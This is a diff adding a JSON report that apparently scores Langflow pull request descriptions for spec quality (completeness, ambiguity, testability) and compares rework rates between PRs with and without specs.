+            "suggestion": "Goal without test: '[ ] Same flow with streaming enabled \u2014 verify same token dis...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow: Chat Input \u2192 Agent (with tools) \u2192 Chat Output",
+            "suggestion": "Goal without test: '[ ] Create a flow: Chat Input \u2192 Agent (with tools) \u2192 Chat Ou...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Run with a message that triggers tool use \u2014 verify accumulated tokens across",
+            "suggestion": "Goal without test: '[ ] Run with a message that triggers tool use \u2014 verify accum...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow: Chat Input \u2192 Agent (no Chat Output connected)",
+            "suggestion": "Goal without test: '[ ] Create a flow: Chat Input \u2192 Agent (no Chat Output connec...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Run the flow \u2014 should complete without errors, node badge shows tokens",
+            "suggestion": "Goal without test: '[ ] Run the flow \u2014 should complete without errors, node badg...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow with Ollama model \u2014 verify token counts appear (uses usage_met",
+            "suggestion": "Goal without test: '[ ] Create a flow with Ollama model \u2014 verify token counts ap...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow with Anthropic (streaming and non-streaming) \u2014 verify correct ",
+            "suggestion": "Goal without test: '[ ] Create a flow with Anthropic (streaming and non-streamin...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Create a flow: Chat Input \u2192 OpenAI \u2192 OpenAI \u2192 Chat Output",
+            "suggestion": "Goal without test: '[ ] Create a flow: Chat Input \u2192 OpenAI \u2192 OpenAI \u2192 Chat Outpu...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "[ ] Run and verify chat message shows accumulated total from both LLMs",
+            "suggestion": "Goal without test: '[ ] Run and verify chat message shows accumulated total from...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Token usage tracking with formatted display (K/M notation) in chat messages and ",
+            "suggestion": "Goal without test: 'Token usage tracking with formatted display (K/M notation) i...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Accumulated token metrics from upstream components visible throughout the flow",
+            "suggestion": "Goal without test: 'Accumulated token metrics from upstream components visible t...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Added comprehensive unit tests for token usage extraction, accumulation, and cal",
+            "suggestion": "Goal without test: 'Added comprehensive unit tests for token usage extraction, a...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12207,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Bottleneck identified: Both PyPI publishing and Docker builds wait for full CI s",
+            "suggestion": "Goal without test: 'Bottleneck identified: Both PyPI publishing and Docker build...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Time impact: 45-60 minutes of 87-112 total minutes (53-67% wasted waiting)",
+            "suggestion": "Goal without test: 'Time impact: 45-60 minutes of 87-112 total minutes (53-67% w...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Cross-platform tests already validate: Installation, dependencies, server startu",
+            "suggestion": "Goal without test: 'Cross-platform tests already validate: Installation, depende...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Explicit opt-in (default: false)",
+            "suggestion": "Goal without test: 'Explicit opt-in (default: false)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Required justification",
+            "suggestion": "Goal without test: 'Required justification' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Team notifications",
+            "suggestion": "Goal without test: 'Team notifications' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Cross-platform tests already catch critical issues (broken installation, missing",
+            "suggestion": "Goal without test: 'Cross-platform tests already catch critical issues (broken i...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Pre-releases are for finding issues - customers expect potential problems",
+            "suggestion": "Goal without test: 'Pre-releases are for finding issues - customers expect poten...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "50% time savings (100 min \u2192 50 min) for urgent scenarios",
+            "suggestion": "Goal without test: '50% time savings (100 min \u2192 50 min) for urgent scenarios' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Risk is acceptable: ~10-15% chance of non-critical issues in pre-release context",
+            "suggestion": "Goal without test: 'Risk is acceptable: ~10-15% chance of non-critical issues in...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Detailed workflow analysis",
+            "suggestion": "Goal without test: 'Detailed workflow analysis' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Risk assessment",
+            "suggestion": "Goal without test: 'Risk assessment' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Implementation code examples",
+            "suggestion": "Goal without test: 'Implementation code examples' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Usage guidelines",
+            "suggestion": "Goal without test: 'Usage guidelines' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Success metrics",
+            "suggestion": "Goal without test: 'Success metrics' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 11636,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 94,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 43,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 3,
+            "type": "ambiguity",
+            "term": "real-time",
+            "suggestion": "Replace 'real-time' with a specific, measurable term"
+          },
+          {
+            "line": 13,
+            "type": "ambiguity",
+            "term": "comprehensive",
+            "suggestion": "Replace 'comprehensive' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add full-stack agentic module: FastAPI streaming endpoint (/api/v1/agentic/assis",
+            "suggestion": "Goal without test: 'Add full-stack agentic module: FastAPI streaming endpoint (/...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add LLM-based intent classification via TranslationFlow that routes between comp",
+            "suggestion": "Goal without test: 'Add LLM-based intent classification via TranslationFlow that...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add floating assistant panel on the canvas with keyboard shortcuts (A to toggle,",
+            "suggestion": "Goal without test: 'Add floating assistant panel on the canvas with keyboard sho...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add provider configuration check endpoint (/check-config) and empty states for u",
+            "suggestion": "Goal without test: 'Add provider configuration check endpoint (/check-config) an...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Add comprehensive backend unit tests and frontend E2E integration tests",
+            "suggestion": "Goal without test: 'Add comprehensive backend unit tests and frontend E2E integr...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "TranslationFlow is session-isolated to prevent cross-flow contamination in messa",
+            "suggestion": "Goal without test: 'TranslationFlow is session-isolated to prevent cross-flow co...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Fallback code extraction ensures component cards appear even when intent is misc",
+            "suggestion": "Goal without test: 'Fallback code extraction ensures component cards appear even...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12296,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 98,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 44,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 1,
+            "type": "ambiguity",
+            "term": "robust",
+            "suggestion": "Replace 'robust' with a specific, measurable term"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Non-finite floats (NaN, Inf, -Inf) are now sanitized to None during serializatio",
+            "suggestion": "Goal without test: 'Non-finite floats (NaN, Inf, -Inf) are now sanitized to None...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Metadata from DoclingDocument objects (such as name, filename, document_id, and ",
+            "suggestion": "Goal without test: 'Metadata from DoclingDocument objects (such as name, filenam...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "File loading methods now use per-instance caching keyed by the markdown flag, pr",
+            "suggestion": "Goal without test: 'File loading methods now use per-instance caching keyed by t...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "In advanced mode, file reading tools now use the markdown output path to avoid t",
+            "suggestion": "Goal without test: 'In advanced mode, file reading tools now use the markdown ou...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "File path validation is improved to prevent command injection, and a timeout is ",
+            "suggestion": "Goal without test: 'File path validation is improved to prevent command injectio...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No context anchors \u2014 AI will invent its own architecture",
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No state transitions \u2014 AI may allow invalid transitions",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      },
+      {
+        "pr_number": 12237,
+        "format": "freeform",
+        "completeness": 0,
+        "ambiguity": 100,
+        "testability": 0,
+        "consistency": 100,
+        "overall": 45,
+        "verdict": "REVIEW",
+        "issues": [
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "acceptance criteria",
+            "suggestion": "Missing expected section: acceptance criteria"
+          },
+          {
+            "line": 0,
+            "type": "completeness",
+            "term": "scope",
+            "suggestion": "Missing expected section: scope"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "lfx.graph.flow_builder -- pure functions for manipulating flow JSON",
+            "suggestion": "Goal without test: 'lfx.graph.flow_builder -- pure functions for manipulating fl...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "component.py -- component CRUD (add, remove, configure, list, field detection)",
+            "suggestion": "Goal without test: 'component.py -- component CRUD (add, remove, configure, list...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "connect.py -- edge creation and disconnection with type-safety checks",
+            "suggestion": "Goal without test: 'connect.py -- edge creation and disconnection with type-safe...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "flow.py -- flow-level operations (create, duplicate)",
+            "suggestion": "Goal without test: 'flow.py -- flow-level operations (create, duplicate)' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "layout.py -- topological layout for positioning nodes",
+            "suggestion": "Goal without test: 'layout.py -- topological layout for positioning nodes' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "lfx.mcp -- standalone MCP server and client",
+            "suggestion": "Goal without test: 'lfx.mcp -- standalone MCP server and client' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "server.py -- 15 MCP tools (auth, flow, component, connection, execution)",
+            "suggestion": "Goal without test: 'server.py -- 15 MCP tools (auth, flow, component, connection...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "client.py -- async MCP client for connecting to the server programmatically",
+            "suggestion": "Goal without test: 'client.py -- async MCP client for connecting to the server p...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "registry.py -- tool registration and dispatch",
+            "suggestion": "Goal without test: 'registry.py -- tool registration and dispatch' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "redact.py -- redaction of sensitive fields (API keys, passwords)",
+            "suggestion": "Goal without test: 'redact.py -- redaction of sensitive fields (API keys, passwo...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "main.py -- lfx-mcp console script entry point",
+            "suggestion": "Goal without test: 'main.py -- lfx-mcp console script entry point' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "src/backend/base/langflow/initial_setup/setup.py -- minor modification",
+            "suggestion": "Goal without test: 'src/backend/base/langflow/initial_setup/setup.py -- minor mo...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "src/lfx/pyproject.toml -- new dependencies for MCP packages",
+            "suggestion": "Goal without test: 'src/lfx/pyproject.toml -- new dependencies for MCP packages' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "src/lfx/tests/testflowbuilder.py -- flow builder unit tests",
+            "suggestion": "Goal without test: 'src/lfx/tests/testflowbuilder.py -- flow builder unit tests' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "src/backend/tests/unit/api/v1/testmcpclient_server.py -- MCP client-server integ",
+            "suggestion": "Goal without test: 'src/backend/tests/unit/api/v1/testmcpclient_server.py -- MCP...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "src/backend/tests/unit/utils/testmcpclient.py -- MCP client unit tests",
+            "suggestion": "Goal without test: 'src/backend/tests/unit/utils/testmcpclient.py -- MCP client ...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Every mutating tool does GET -> modify -> PATCH. No in-memory flow state",
+            "suggestion": "Goal without test: 'Every mutating tool does GET -> modify -> PATCH. No in-memor...' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Connecting via componentastool auto-enables tool_mode",
+            "suggestion": "Goal without test: 'Connecting via componentastool auto-enables tool_mode' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Sensitive fields (API keys, passwords) are redacted",
+            "suggestion": "Goal without test: 'Sensitive fields (API keys, passwords) are redacted' \u2014 add a Given/When/Then criterion"
+          },
+          {
+            "line": 0,
+            "type": "testability",
+            "term": "Lives in lfx.mcp with zero langflow dependencies (only httpx, mcp, lfx.graph.flo",
+            "suggestion": "Goal without test: 'Lives in lfx.mcp with zero langflow dependencies (only httpx...' \u2014 add a Given/When/Then criterion"
+          }
+        ],
+        "warnings": [
+          "No I/O contracts \u2014 AI will invent API shapes",
+          "No side effects listed \u2014 AI may miss integrations",
+          "No error contract \u2014 AI will invent error shapes per function",
+          "No style/architecture rules \u2014 AI may violate module boundaries or conventions"
+        ]
+      }
+    ]
+  },
+  "effectiveness": {
+    "specd_rework_rate": 0.2667,
+    "unspecd_rework_rate": 0.24,
+    "delta": 0.0267,
+    "specd_sample_size": 15,
+    "unspecd_sample_size": 75,
+    "significance": "limited",
+    "signals": [
+      {
+        "type": "bug-fix",
+        "source": "12263",
+        "target": "12234",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/v1/files.py",
+          "src/backend/tests/unit/api/v1/test_files.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12330",
+        "target": "12309",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "docker/build_and_push.Dockerfile",
+          "docker/build_and_push_backend.Dockerfile",
+          "docker/build_and_push_base.Dockerfile",
+          "docker/build_and_push_ep.Dockerfile",
+          "docker/build_and_push_with_extras.Dockerfile"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12333",
+        "target": "12330",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "docker/build_and_push.Dockerfile",
+          "docker/build_and_push_backend.Dockerfile",
+          "docker/build_and_push_base.Dockerfile",
+          "docker/build_and_push_ep.Dockerfile",
+          "docker/build_and_push_with_extras.Dockerfile"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "11999",
+        "target": "12304",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/initial_setup/starter_projects/Nvidia Remix.json",
+          "src/lfx/src/lfx/_assets/component_index.json"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12329",
+        "target": "12333",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/lfx/src/lfx/_assets/component_index.json",
+          "src/lfx/src/lfx/_assets/stable_hash_history.json",
+          "src/lfx/src/lfx/base/models/unified_models.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12328",
+        "target": "12255",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/alembic/versions/ef4b036b585d_add_session_metadata_column_to_message_.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12334",
+        "target": "11999",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/initial_setup/starter_projects/Nvidia Remix.json",
+          "src/lfx/src/lfx/_assets/component_index.json",
+          "src/lfx/src/lfx/components/FAISS/faiss.py",
+          "src/lfx/tests/unit/components/test_faiss_vector_store_component.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12288",
+        "target": "12333",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/tests/unit/test_credential_resolution.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12300",
+        "target": "12333",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/v2/files.py",
+          "src/backend/tests/unit/api/v2/test_files.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12337",
+        "target": "12243",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/v1/knowledge_bases.py",
+          "src/backend/tests/unit/test_knowledge_bases_api.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12323",
+        "target": "12335",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "pyproject.toml",
+          "src/backend/base/pyproject.toml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12331",
+        "target": "12333",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "docker/build_and_push.Dockerfile",
+          "docker/build_and_push_backend.Dockerfile",
+          "docker/build_and_push_base.Dockerfile",
+          "docker/build_and_push_ep.Dockerfile",
+          "docker/build_and_push_with_extras.Dockerfile"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12305",
+        "target": "12323",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "pyproject.toml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12202",
+        "target": "12119",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/v1/monitor.py",
+          "src/backend/tests/unit/test_messages_endpoints.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12402",
+        "target": "12304",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/frontend/tests/core/features/folder-deletion-integrity.spec.ts"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12405",
+        "target": "12294",
+        "classification": "heuristic",
+        "overlapping_files": [
+          ".github/workflows/typescript_test.yml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12361",
+        "target": "12305",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/v1/chat.py",
+          "src/backend/tests/unit/test_chat_endpoint.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12416",
+        "target": "12383",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/pyproject.toml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12306",
+        "target": "12294",
+        "classification": "heuristic",
+        "overlapping_files": [
+          ".github/workflows/ci.yml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12412",
+        "target": "12294",
+        "classification": "heuristic",
+        "overlapping_files": [
+          ".github/workflows/ci.yml"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12366",
+        "target": "12361",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/build.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12362",
+        "target": "12108",
+        "classification": "heuristic",
+        "overlapping_files": [
+          ".secrets.baseline"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12296",
+        "target": "12373",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/initial_setup/starter_projects/Document Q&A.json",
+          "src/backend/base/langflow/initial_setup/starter_projects/Portfolio Website Code Generator.json",
+          "src/backend/base/langflow/initial_setup/starter_projects/Text Sentiment Analysis.json",
+          "src/backend/base/langflow/initial_setup/starter_projects/Vector Store RAG.json",
+          "src/lfx/src/lfx/_assets/component_index.json"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12419",
+        "target": "12371",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/frontend/package.json"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12421",
+        "target": "12361",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/base/langflow/api/build.py",
+          "src/backend/base/langflow/api/v1/chat.py",
+          "src/backend/tests/unit/test_chat_endpoint.py",
+          "src/frontend/src/components/core/playgroundComponent/chat-view/utils/message-event-handler.ts",
+          "src/frontend/src/customization/utils/custom-buildUtils.ts",
+          "src/frontend/src/utils/buildUtils.ts"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12434",
+        "target": "12389",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/tests/unit/api/v1/test_deployment_mapper_watsonx.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12436",
+        "target": "12389",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/tests/unit/services/deployment/test_watsonx_orchestrate.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12438",
+        "target": "12436",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/backend/tests/unit/services/deployment/test_watsonx_orchestrate.py"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12204",
+        "target": "11891",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "src/lfx/src/lfx/_assets/component_index.json"
+        ]
+      },
+      {
+        "type": "bug-fix",
+        "source": "12447",
+        "target": "12445",
+        "classification": "heuristic",
+        "overlapping_files": [
+          "docs/static/img/langflow-logo-color-black-solid.svg",
+          "docs/static/img/langflow-logo-color-blue-bg.svg"
+        ]
+      }
+    ],
+    "by_complexity": {
+      "medium": {
+        "specd_rework_rate": 0.3333,
+        "unspecd_rework_rate": 0.2222,
+        "specd_count": 6,
+        "unspecd_count": 18
+      },
+      "large": {
+        "specd_rework_rate": 0.1429,
+        "unspecd_rework_rate": 0.28,
+        "specd_count": 7,
+        "unspecd_count": 25
+      }
+    }
+  }
+}
